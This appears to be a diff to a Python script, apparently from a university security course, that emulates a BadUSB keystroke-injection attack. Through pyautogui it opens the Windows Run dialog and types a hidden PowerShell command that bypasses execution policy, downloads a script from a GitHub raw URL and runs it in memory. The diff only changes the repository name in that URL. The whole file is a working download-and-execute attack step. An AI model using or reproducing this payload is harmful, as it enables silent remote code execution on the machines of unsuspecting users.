@@ -5,5 +5,5 @@ import time
 pyautogui.hotkey("win","R")
 time.sleep(0.5)
 # Download and run in memory a PowerShell script. This powershell will then download the payload and run it.
-pyautogui.typewrite("powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/tierChampion/INF8108-TP1-Usb/master/nice.ps1?dl=1; invoke-expression $pl", interval=0.02)
+pyautogui.typewrite("powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/tierChampion/DuckyPOC/master/nice.ps1?dl=1; invoke-expression $pl", interval=0.02)
 pyautogui.hotkey("enter")
